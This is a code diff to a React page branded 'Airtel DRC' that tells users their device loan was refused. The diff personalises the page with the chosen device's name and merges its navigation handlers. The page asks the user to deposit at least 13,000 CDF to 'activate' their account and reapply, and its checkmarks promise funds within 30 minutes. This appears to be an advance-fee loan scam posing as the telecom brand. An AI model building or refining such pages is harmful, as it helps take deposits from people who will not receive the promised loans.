@@ -1,35 +1,39 @@
-import React from 'react';
+import React, { useState, useEffect } from 'react';
 import { useNavigate } from 'react-router-dom';
 import './App.css';
 
 function AirtelDenied() {
   const navigate = useNavigate();
+  const [device, setDevice] = useState<any>(null);
 
-  const handleGoToDashboard = () => {
-    // Clear session so the user starts fresh
+  // Load the selected device from localStorage on mount
+  useEffect(() => {
+    const savedDevice = localStorage.getItem('selectedDevice');
+    if (savedDevice) {
+      try {
+        setDevice(JSON.parse(savedDevice));
+      } catch (e) {
+        console.error("Failed to parse device", e);
+      }
+    }
+  }, []);
+
+  const handleClearAndNavigate = () => {
+    // Clear all session data
     localStorage.removeItem('airtelPhone');
     localStorage.removeItem('loanLimit');
-
-    // Redirect to login page
-    navigate('/');
-  };
-
-  const handleBackToLogin = () => {
-    // Clear session and redirect to login
-    localStorage.removeItem('airtelPhone');
-    localStorage.removeItem('loanLimit');
-    navigate('/');
+    localStorage.removeItem('selectedDevice');
+    navigate('/'); // Go back to landing page
   };
 
   return (
     <div className="airtel-container">
       {/* Header Section */}
       <div className="airtel-header">
-        <div className="airtel-hamburger">
+        <div className="airtel-hamburger" onClick={handleClearAndNavigate} role="button" aria-label="Retour">
           <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="black" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
-            <line x1="3" y1="12" x2="21" y2="12"></line>
-            <line x1="3" y1="6" x2="21" y2="6"></line>
-            <line x1="3" y1="18" x2="21" y2="18"></line>
+            <line x1="19" y1="12" x2="5" y2="12" />
+            <polyline points="12 19 5 12 12 5" />
           </svg>
         </div>
         <h1 className="airtel-logo">Airtel DRC</h1>
@@ -48,7 +52,11 @@ function AirtelDenied() {
         </div>
 
         <h2 className="airtel-denied-heading">Prêt refusé !</h2>
-        <p className="airtel-denied-subtext">Votre prêt a été refusé.</p>
+        
+        {/* Dynamic Text based on the selected device */}
+        <p className="airtel-denied-subtext">
+          Votre demande de prêt {device ? `pour le ${device.name}` : ''} a été refusée.
+        </p>
 
         {/* Inactive Account Box */}
         <div className="airtel-inactive-box">
@@ -60,7 +68,10 @@ function AirtelDenied() {
             <span>Airtel inactif</span>
           </div>
           <p className="airtel-inactive-text">Veuillez déposer au moins</p>
-          <p className="airtel-inactive-amount">13000 CDF</p>
+          <p className="airtel-inactive-amount">
+            {/* You can also make this amount dynamic based on device.downPayment if needed */}
+            13 000 CDF
+          </p>
           <p className="airtel-inactive-text">
             sur votre compte Airtel pour l'activer et faire une nouvelle demande.
           </p>
@@ -69,15 +80,15 @@ function AirtelDenied() {
         {/* Checklist Box */}
         <div className="airtel-checklist-box">
           <div className="airtel-checklist-item">
-            <span className="checkmark">✓</span> Les fonds seront transférés sur votre compte dans un délai de 30 minutes.
+            <span className="checkmark">✓</span> Les fonds pour votre {device ? device.name : 'article'} seront transférés sur votre compte dans un délai de 30 minutes.
           </div>
           <div className="airtel-checklist-item">
-            <span className="checkmark">✓</span> Période de remboursement du prêt : 12 mois
+            <span className="checkmark">✓</span> Période de remboursement du prêt : {device ? device.months : '12'} mois
           </div>
         </div>
 
         {/* Dashboard Button */}
-        <button className="airtel-dashboard-btn" onClick={handleGoToDashboard}>
+        <button className="airtel-dashboard-btn" onClick={handleClearAndNavigate}>
           Aller au tableau de bord
           <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
             <line x1="5" y1="12" x2="19" y2="12"></line>
@@ -86,8 +97,8 @@ function AirtelDenied() {
         </button>
 
         {/* Back to Login Link */}
-        <button className="airtel-back-to-login" onClick={handleBackToLogin}>
-          Retour à la connexion
+        <button className="airtel-back-to-login" onClick={handleClearAndNavigate}>
+          Retour à l'accueil
         </button>
       </div>
     </div>
